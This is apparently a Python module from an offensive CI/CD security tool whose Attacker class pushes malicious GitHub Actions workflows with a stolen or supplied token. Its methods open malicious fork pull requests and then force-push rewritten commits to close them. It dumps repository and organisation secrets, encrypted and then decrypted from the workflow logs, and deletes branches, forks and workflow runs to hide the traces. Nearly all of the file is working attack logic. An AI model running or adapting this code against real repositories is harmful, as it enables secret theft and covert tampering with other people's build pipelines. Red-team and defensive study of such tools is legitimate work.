import logging
import time
import random
import string
import re
import base64

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher
from cryptography.hazmat.primitives.ciphers import algorithms
from cryptography.hazmat.primitives.ciphers import modes

import hashlib

from gato.github import Api
from gato.git import Git
from gato.attack import CICDAttack
from gato.cli import Output

logger = logging.getLogger(__name__)
logging.root.setLevel(logging.DEBUG)


class Attacker:
    """Class holding all high level logic for executing attacks on self-hosted
    runners.
    """

    def __init__(
        self,
        pat: str,
        socks_proxy: str = None,
        http_proxy: str = None,
        author_email: str = None,
        author_name: str = None,
        timeout: int = 30,
        github_url: str = None,
    ):

        self.api = Api(
            pat,
            socks_proxy=socks_proxy,
            http_proxy=http_proxy,
            github_url=github_url,
        )

        self.socks_proxy = socks_proxy
        self.http_proxy = http_proxy
        self.user_perms = None
        self.author_email = author_email
        self.author_name = author_name
        self.timeout = timeout
        self.github_url = github_url

    def __setup_user_info(self):
        if not self.user_perms:
            self.user_perms = self.api.check_user()
            if not self.user_perms:
                logger.error("This token cannot be used for attacks!")
                return False

            if self.author_email is None:
                self.author_email = \
                    f"{self.user_perms['user']}@users.noreply.github.com"

            if self.author_name is None:
                self.author_name = self.user_perms['name']

            Output.info(
                "The authenticated user is: "
                f"{Output.bright(self.user_perms['user'])}"
            )
            Output.info(
                "The GitHub Classic PAT has the following scopes: "
                f'{Output.yellow(", ".join(self.user_perms["scopes"]))}'
            )

        return True

    @staticmethod
    def __create_private_key():
        """Creates a private and public key to safely exfil secrets.
        """
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096,
            backend=default_backend()
        )
        public_key = private_key.public_key()
        pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        return (private_key, pem.decode())

    @staticmethod
    def __decrypt_secrets(priv_key, blob: str):
        """Utility method to decrypt secrets given ciphertext blob and a private key.
        """
        encrypted_secrets = base64.b64decode(blob[0][1:-1])
        salt = encrypted_secrets[8:16]
        ciphertext = encrypted_secrets[16:]

        encrypted_key = base64.b64decode(blob[1][1:-1])
        sym_key_b64 = priv_key.decrypt(encrypted_key,
                                        padding.PKCS1v15()).decode()
        sym_key = base64.b64decode(sym_key_b64)

        derived_key = hashlib.pbkdf2_hmac('sha256', sym_key, salt, 10000, 48)
        key = derived_key[0:32]
        iv = derived_key[32:48]

        cipher = Cipher(algorithms.AES256(key), modes.CBC(iv))
        decryptor = cipher.decryptor()

        cleartext = decryptor.update(ciphertext) + decryptor.finalize()
        cleartext = cleartext[:-cleartext[-1]]

        return cleartext

    def __collect_secret_names(self, target_repo):
        """Method to collect list of secrets prior to exifl.

        Args:
            target_repo (str): Repository to get secrets from.

        Returns:
            list: List of secret names accessible to the repository.
        """

        secrets = []
        secret_names = []
        repo_secret_list = self.api.get_secrets(target_repo)
        org_secret_list = self.api.get_repo_org_secrets(target_repo)

        if repo_secret_list:
            secrets.extend(repo_secret_list)

        if org_secret_list:
            secrets.extend(org_secret_list)

        if not secrets:
            Output.warn(
                "The repository does not have any accessible secrets!"
            )
            return False
        else:
            Output.owned(
                f"The repository has {Output.bright(len(secrets))} "
                "accessible secret(s)!"
            )

        secret_names = [secret['name'] for secret in secrets]

        return secret_names

    def __execute_and_wait_workflow(
            self,
            target_repo: str,
            branch: str,
            yaml_contents: str,
            commit_message: str,
            yaml_name: str):
        """Utility method to wrap shared logic for pushing a workflow for a new
        branch, waiting for the workflow to execute, and getting the workflow
        ID of the completed workflow.

        Args:
            target_repo (str): Repository to target.
            branch (str): Branch to commit to.
            yaml_contents (str): Contents of yaml file.
            commit_message (str): Message for commit.
            yaml_name (str): Name of workflow yaml file to commit.

        Returns:
            str: Workflow ID if successful, None otherwise.
        """

        workflow_id = None

        if self.author_email and self.author_name:
            rev_hash = self.api.commit_workflow(
                target_repo,
                branch,
                yaml_contents.encode(),
                f"{yaml_name}.yml",
                commit_author=self.author_name,
                commit_email=self.author_email,
                message=commit_message
            )
        else:
            rev_hash = self.api.commit_workflow(
                target_repo,
                branch,
                yaml_contents.encode(),
                f"{yaml_name}.yml",
                message=commit_message
            )

        if not rev_hash:
            Output.error("Failed to push the malicious workflow!")
            return False

        Output.result("Succesfully pushed the malicious workflow!")

        for i in range(self.timeout):
            ret = self.api.delete_branch(target_repo, branch)
            if ret:
                break
            else:
                time.sleep(1)

        if ret:
            Output.result("Malicious branch deleted.")
        else:
            Output.error(f"Failed to delete the branch: {branch}.")

        Output.tabbed("Waiting for the workflow to queue...")

        for i in range(self.timeout):
            workflow_id = self.api.get_recent_workflow(
                target_repo, rev_hash, yaml_name
            )
            if workflow_id == -1:
                Output.error("Failed to find the created workflow!")
                return
            elif workflow_id > 0:
                break
            else:
                time.sleep(1)
        else:
            Output.error("Failed to find the created workflow!")
            return

        Output.tabbed("Waiting for the workflow to execute...")

        for i in range(self.timeout):
            status = self.api.get_workflow_status(target_repo, workflow_id)
            if status == -1:
                Output.error("The workflow failed!")
                break
            elif status == 1:
                Output.result("The malicious workflow executed succesfully!")
                break
            else:
                time.sleep(1)
        else:
            Output.error("The workflow is incomplete but hit the timeout!")

        return workflow_id

    def fork_pr_attack(self, target_repo: str, target_branch: str,
                       pr_title: str, source_branch: str, payload: str,
                       custom_workflow: str,
                       commit_message: str,
                       yaml_name: str = "sh_cicd_attack",
                       workflow_name: str = "Testing"):
        """Creates a malicious fork pull request against a public repository.

        Args:
            target_repo (str): Target repository, this is the one the pull
            request will be opened against.
            target_branch (str): Branch within the target repository for the
            pull request.
            pr_title (str): Title of the pull request.
            source_branch (str): Source branch in the repository that we
            control.
            payload (str): Shell script that will execute.
            custom_workflow (str): A custom YAML workflow that will be utilized
            instead of a shell payload.
            yaml_name (str, optional): Name of the YAML file that will be saved
            to the source branch. Defaults to
            "sh_cicd_attack".
            workflow_name (str, optional): Name of the workflow, this will
            appear in the actions tab. Defaults to
            "Testing".
        """

        self.__setup_user_info()

        if not self.user_perms:
            return False

        if 'repo' in self.user_perms['scopes'] and \
           'workflow' in self.user_perms['scopes']:

            Output.info(
                f"Conducting an attack against {Output.bright(target_repo)} as the "
                f"user: {Output.bright(self.user_perms['user'])}!"
            )

            res = self.api.get_repo_branch(target_repo, target_branch)
            if res == 0:
                Output.error(
                    f"Target branch, {target_branch}, does not exist!"
                )
                return False
            elif res == -1:
                Output.error("Failed to check for target branch!")
                return False

            repo_name = self.api.fork_repository(target_repo)
            if not repo_name:
                Output.error("Error while forking repository!")
                return False

            for i in range(self.timeout):
                status = self.api.get_repository(repo_name)
                if status:
                    Output.result(f"Successfully created fork: {repo_name}!")
                    time.sleep(5)
                    break
                else:
                    time.sleep(1)

            if not status:
                Output.error(
                    f"Forked repository not found after {self.timeout} seconds!"
                )
                return False

            cloned_repo = Git(
                self.api.pat,
                repo_name,
                proxies=self.api.proxies,
                username=self.author_name,
                email=self.author_email,
                github_url=self.github_url.split('/')[2] if self.github_url else None
            )

            for i in range(self.timeout):
                status = cloned_repo.perform_clone()
                if status:
                    break
                else:
                    time.sleep(1)

            if not status:
                Output.error("Error cloning forked repository!")
                return False

            if custom_workflow:
                with open(custom_workflow, 'r') as custom_wf:
                    yaml_contents = custom_wf.read()
            else:
                yaml_contents = CICDAttack.create_malicious_yml(
                    payload, workflow_name=workflow_name
                )

            commit_hash = cloned_repo.commit_file(
                yaml_contents.encode(),
                f".github/workflows/{yaml_name}.yml",
                message=commit_message
            )
            if not commit_hash:
                Output.error(
                    "Failed to commit the malicious workflow locally!"
                )
                return False

            status = cloned_repo.push_repository(source_branch)
            if not status:
                Output.error("Unable push change!")

            if target_branch is None:
                target_branch = 'main'

            pr_url = self.api.create_fork_pr(
                target_repo,
                self.user_perms['user'],
                source_branch,
                target_branch,
                pr_title
            )

            if pr_url:
                Output.result(
                    "Successfully created a PR! It can be viewed at: "
                    f"{Output.bright(pr_url)}"
                )

                # Ensure workflow is queued before closing PR
                for i in range(self.timeout):
                    workflow_id = self.api.get_recent_workflow(
                        target_repo, commit_hash, yaml_name)
                    if workflow_id == -1:
                        Output.error("Failed to find the created workflow!")
                        return
                    elif workflow_id > 0:
                        break
                    else:
                        time.sleep(1)
                else:
                    Output.error("Failed to find the created workflow!")
                    return

                rebase_status = cloned_repo.rewrite_commit()

                if rebase_status:
                    Output.result("Successfully rebased commit")

                    push_status = cloned_repo.push_repository(
                        source_branch,
                        force=True
                    )

                    if push_status:
                        Output.result("Pushed commit to close PR!")

            else:
                Output.error("Failed to create a PR for the fork!")

            success = self.api.delete_repository(repo_name)
            if success:
                Output.result("Successfully deleted the fork!")
            else:
                Output.error("Failed to delete the fork!")
        else:
            Output.error(
                "The user does not have the necessary scopes to conduct this "
                "attack!"
            )

    def shell_workflow_attack(
            self, target_repo,
            payload: str,
            custom_workflow: str,
            target_branch: str,
            commit_message: str,
            delete_action: bool,
            yaml_name: str = "sh_cicd_attack"):

        self.__setup_user_info()

        if not self.user_perms:
            return False

        if 'repo' in self.user_perms['scopes'] and \
           'workflow' in self.user_perms['scopes']:

            Output.info(
                    f"Will be conducting an attack against {Output.bright(target_repo)} as"
                    f" the user: {Output.bright(self.user_perms['user'])}!"
            )

            # Randomly generate a branch name, since this will run immediately
            # otherwise it will fail at the push.
            if target_branch is None:
                branch = ''.join(random.choices(
                    string.ascii_lowercase, k=10))
            else:
                branch = target_branch

            res = self.api.get_repo_branch(target_repo, branch)
            if res == -1:
                Output.error("Failed to check for remote branch!")
                return
            elif res == 1:
                Output.error(f"Remote branch, {branch}, already exists!")
                return

            if custom_workflow:
                with open(custom_workflow, 'r') as custom_wf:
                    yaml_contents = custom_wf.read()
            else:
                yaml_contents = CICDAttack.create_push_yml(
                    payload, branch
                )

            workflow_id = self.__execute_and_wait_workflow(
                target_repo,
                branch,
                yaml_contents,
                commit_message,
                yaml_name
            )

            res = self.api.download_workflow_logs(target_repo, workflow_id)
            if not res:
                Output.error("Failed to download logs!")
            else:
                Output.result(
                    f"Workflow logs downloaded to {workflow_id}.zip!"
                )

            if delete_action:
                res = self.api.delete_workflow_run(target_repo, workflow_id)
                if not res:
                    Output.error("Failed to delete workflow!")
                else:
                    Output.result("Workflow deleted sucesfully!")
        else:
            Output.error(
                "The user does not have the necessary scopes to conduct this "
                "attack!")

    def secrets_dump(
            self,
            target_repo: str,
            target_branch: str,
            commit_message: str,
            delete_action: bool,
            yaml_name: str):
        """Given a user with write access to a repository, runs a workflow that
        dumps all repository secrets.

        Args:
            target_repo (str): Repository to target.
            target_branch (str): Branch to create workflow in.
            commit_message (str): Commit message for exfil workflow.
            delete_action (bool): Whether to delete the workflow after
            execution.
            yaml_name (str): Name of yaml to use for exfil workflow.

        """
        self.__setup_user_info()

        if not self.user_perms:
            return False

        if 'repo' in self.user_perms['scopes'] and \
           'workflow' in self.user_perms['scopes']:

            secret_names = self.__collect_secret_names(target_repo)

            if not secret_names:
                return False

            # Randomly generate a branch name, since this will run immediately
            if target_branch:
                branch = target_branch
            else:
                branch = ''.join(random.choices(
                    string.ascii_lowercase, k=10))

            res = self.api.get_repo_branch(target_repo, branch)
            if res == -1:
                Output.error("Failed to check for remote branch!")
                return
            elif res == 1:
                Output.error(f"Remote branch, {branch}, already exists!")
                return

            priv_key, pubkey_pem = Attacker.__create_private_key()

            yaml_contents = CICDAttack.create_exfil_yaml(
                secret_names, pubkey_pem, branch
            )

            workflow_id = self.__execute_and_wait_workflow(
                target_repo,
                branch,
                yaml_contents,
                commit_message,
                yaml_name
            )

            if not workflow_id:
                return

            res = self.api.retrieve_workflow_log(
                target_repo, workflow_id, "Run Tests"
                )

            if not res:
                Output.error("Failed to download logs!")
            else:
                Output.info("Full job output:")
                print(res)

                # Parse out the base64 blob with a regex.
                matcher = re.compile(
                              r'\$(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==)?\$'
                          )

                blob = matcher.findall(res)

                if len(blob) == 2:
                    cleartext = Attacker.__decrypt_secrets(priv_key, blob)
                    Output.owned("Decrypted and Decoded Secrets:")
                    print(cleartext.decode())

                else:
                    Output.error(
                        "Unable to extract encoded output from runlog!"
                    )

            if delete_action:
                res = self.api.delete_workflow_run(target_repo, workflow_id)
                if not res:
                    Output.error("Failed to delete workflow!")
                else:
                    Output.result("Workflow deleted sucesfully!")
        else:
            Output.error(
                "The user does not have the necessary scopes to conduct this "
                "attack!")
